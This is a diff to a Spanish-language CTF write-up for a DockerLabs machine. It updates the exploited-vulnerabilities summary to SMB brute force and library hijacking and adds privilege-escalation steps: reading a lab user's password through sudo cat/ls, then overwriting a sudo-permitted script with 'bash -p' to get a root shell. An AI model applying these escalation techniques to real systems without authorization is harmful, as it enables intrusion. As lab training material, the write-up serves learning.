@@ -10,10 +10,11 @@ Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/Qaky0DoJ#AfyxhrLvz8n_K
 - **Plataforma:** DockerLabs
 - **Dirección IP:** 172.17.0.2
 - **Vulnerabilidades Explotadas:**
-  - **HTML Injection:** Permite ejecutar código HTML malicioso en la página web de Pinguinazo.
-  - **Server-Side Template Injection (SSTI):** Aprovechada para ejecutar comandos en el servidor mediante plantillas mal configuradas.
+  - **SMB Brute Force**
 - **Escalada de Privilegios:**
-  - Aprovechamiento de `sudo java` para ejecutar código como root sin autenticación, utilizando un archivo JAR malicioso generado con `msfvenom`.
+  - Uso de permisos sudo con Python y Library Hijacking.
+  - Exposición de credenciales en archivos accesibles.
+  - Uso de un script con permisos sudo para obtener una shell como root.
 
 ## Reconocimiento y Enumeración
 Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.
@@ -173,3 +174,64 @@ os.system("/bin/bash")
 Y tan solo haciendo eso ya tendremos también la escalada al usuario `aria`.
 
 ![imagen](https://github.com/user-attachments/assets/bc669d3b-b54a-4374-8b5c-d337ff76ccba)
+
+## Escalada de privilegios a `daenerys`
+Haciendo `sudo -l` con `aria` vemos que tenemos permisos para ejecutar como el usuario `daenerys` los siguientes comandos:
+
+```bash
+(daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
+```
+
+![imagen](https://github.com/user-attachments/assets/4ee95d19-775a-4870-8c75-4dd0b2d9f6b5)
+
+Podemos ejecutar el comando `ls -la` para ver ue hay en el directorio de `daenerys`, vemos que existe un archivo llamado `mensajeParaJon` y otro llamado `.secret`.
+
+```bash
+sudo -u daenerys /usr/bin/ls -la daenerys/
+```
+
+![imagen](https://github.com/user-attachments/assets/76465435-b57b-4436-a1db-d3e1815630ab)
+
+Pues bastante fácil, el usuario `daenerys` expone su contraseña en el archivo `mensajeParaJon`.
+
+```bash
+sudo -u daenerys /usr/bin/cat daenerys/mensajeParaJon
+```
+
+![imagen](https://github.com/user-attachments/assets/d559596e-b6c4-41ca-ae28-a28a4c9d1289)
+
+  - User: daenerys
+  - Password: drakaris
+
+![imagen](https://github.com/user-attachments/assets/d7569435-3722-4730-9494-fd87d6619d4e)
+
+## Escalada de privilegios a Root
+Ejecutando otra vez `sudo -l` pero con `daenerys`, tenemos permisos para ejecutar como root un script llamado `.shell.sh`.
+
+```bash
+(ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
+```
+
+![imagen](https://github.com/user-attachments/assets/b59230f0-4962-4d63-b94b-c1ef1e56b2d3)
+
+Bastante fácil también, vemos que tenemos permisos de lectura y escritura así que vamos a modificarlo, aparentemente es un script el cuál podemos mandarnos una reverse shell.
+
+![imagen](https://github.com/user-attachments/assets/96b1f55f-0498-4987-accf-8ca7a946242f)
+
+Lo modificaremos y pondremos lo siguiente:
+
+```.shell.sh
+#!/bin/bash
+
+bash -p
+```
+
+Ahora cuando ejecutemos el script, como lo estaremos ejecutando como `root` lo que hará será otorgarnos una bash con privilegios.
+
+```bash
+sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
+```
+
+![imagen](https://github.com/user-attachments/assets/d7324a55-69ee-42ef-ae07-af06bd332b14)
+
+Como podemos ver ya nos habríamos convertido en usuario root. Máquina muy chula en la que se puede aprender varios conceptos como la ferxa bruta y los distintos vectores de escaladas.
